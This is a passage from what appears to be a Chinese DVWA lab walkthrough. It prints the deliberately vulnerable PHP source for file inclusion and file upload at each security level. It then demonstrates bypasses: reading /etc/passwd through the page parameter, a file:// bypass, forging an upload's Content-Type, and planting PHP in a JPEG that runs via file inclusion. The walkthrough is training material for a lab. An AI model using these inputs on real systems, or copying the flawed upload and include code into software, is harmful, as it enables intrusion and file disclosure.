class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//File Inclusion</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-4"><a class="markdownIt-Anchor" href="#low-4">#</a> Low</h3><ul><li>GET 方法传参，直接修改网址，查看 /etc/passwd</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin </span><br></pre></td></tr></table></figure><h3 id="medium-4"><a class="markdownIt-Anchor" href="#medium-4">#</a> Medium</h3><ul><li><p>过滤了 “http://”, “https://”，“…/&quot;,&quot;…\&quot;</p></li><li><p>可以构造 &quot;httphttp://😕/&quot; 异形路径</p></li><li><p>同 Low 等级</p></li></ul><h3 id="high-4"><a class="markdownIt-Anchor" href="#high-4">#</a> High</h3><ul><li><p>加入黑名单机制，参数只能以 file 开头</p></li><li><p>构造参数</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></figure><ul><li>使用 file 协议访问本地文件</li></ul><h2 id="file-upload"><a class="markdownIt-Anchor" href="#file-upload">#</a> File Upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//File Upload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-5"><a class="markdownIt-Anchor" href="#low-5">#</a> Low</h3><ul><li>随便上传，无限制</li></ul><h3 id="medium-5"><a class="markdownIt-Anchor" href="#medium-5">#</a> Medium</h3><ul><li>限制文件类型，但是可以改包上传 Content-Type: image/png</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.23.133</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Length: 977</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.23.133</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/upload/</span><br><span class="line"></span><br><span class="line">Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line"></span><br><span class="line">-----------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><ul><li>txt 上传成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/a.txt succesfully uploaded!</span><br></pre></td></tr></table></figure><h3 id="high-5"><a class="markdownIt-Anchor" href="#high-5">#</a> High</h3><ul><li>加入内容检测和文件类型检测</li><li>通过在图片中加入一句话木马实现上传</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/th.jpeg succesfully uploaded!</span><br></pre></td></tr></table></figure><ul><li>通过文件包含漏洞解析上传图片</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210427184134233.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210427184134233"></p><h2 id="insecure-captcha"><a class="markdownIt-Anchor" href="#insecure-captcha">#</a> Insecure CAPTCHA</h2><h3 id="low-6"><a class="markdownIt-Anchor" href="#low-6">#</a> Low</h3><ul><li>修改包的参数 step=2 即可。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 